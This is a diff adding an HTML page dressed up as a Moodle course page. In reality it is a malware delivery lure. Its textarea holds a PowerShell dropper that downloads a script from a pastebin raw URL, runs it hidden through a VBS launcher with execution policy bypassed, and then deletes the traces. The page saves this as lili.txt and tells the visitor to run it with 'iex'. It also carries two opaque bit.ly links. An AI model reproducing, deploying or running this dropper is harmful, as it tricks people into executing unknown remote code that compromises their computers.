@@ -1,1 +1,95 @@
-`
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<title>Course: Inteligentné systémy v informatike | moodle</title>
+<link rel="icon" type="image/png" href="favicon.png">
+<style>
+  body {
+    margin: 0;
+    background: #f3f3f3;
+    font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+    padding: 24px;
+  }
+
+  textarea {
+    width: 100%;
+    height: 20vh;
+    resize: none;
+    background: white;
+    border: 1px solid #cfcfcf;
+    border-radius: 6px;
+    padding: 14px;
+    font-family: Consolas, Menlo, Monaco, monospace;
+    font-size: 14px;
+    line-height: 1.45;
+    box-shadow: inset 0 0 0 1px #e5e5e5;
+  }
+
+  textarea:focus {
+    outline: none;
+    border-color: #2563eb;
+  }
+
+  button {
+    margin-top: 12px;
+    padding: 8px 14px;
+    border-radius: 6px;
+    border: 1px solid #cfcfcf;
+    background: white;
+    cursor: pointer;
+    font-weight: 600;
+  }
+
+  button:hover {
+    background: #f0f0f0;
+  }
+.cmd {
+  margin-top: 14px;
+  padding: 0;
+  background: none;
+  color: #000;
+  font-family: Consolas, Menlo, Monaco, monospace;
+  font-size: 13px;
+  white-space: pre-wrap;
+  user-select: text;
+}
+</style>
+</head>
+<body>
+
+<textarea id="content" readonly>
+$url = "https://pastebin.com/raw/K9J6wYsP"; $tmpFile = "$env:TEMP\tmp_$(Get-Random).ps1"; Invoke-WebRequest -Uri $url -OutFile $tmpFile; $vbsFile = "$env:TEMP\run_$(Get-Random).vbs"; @"
+CreateObject("Wscript.Shell").Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$tmpFile""", 0, False
+"@ | Out-File $vbsFile -Encoding ASCII; Start-Process wscript.exe -ArgumentList """$vbsFile""" -WindowStyle Hidden; Start-Sleep -Seconds 2; Remove-Item $tmpFile -Force -ErrorAction SilentlyContinue; Remove-Item $vbsFile -Force -ErrorAction SilentlyContinue
+</textarea>
+
+<button id="download">Скачать lili.txt</button>
+
+<div class="cmd">
+cd ~\Download
+iex (gc lili.txt -Raw)
+</div>
+
+<div class="links">
+  <button onclick="window.open('https://bit.ly/skuka777','_blank')">1</button>
+  <button onclick="window.open('https://bit.ly/iokd','_blank')">2</button>
+</div>
+
+<script>
+const textarea = document.getElementById("content");
+const fileText = textarea.value;
+
+textarea.focus();
+
+document.getElementById("download").onclick = () => {
+  const blob = new Blob([fileText], { type: "text/plain" });
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(blob);
+  a.download = "lili.txt";
+  a.click();
+};
+</script>
+
+</body>
+</html>
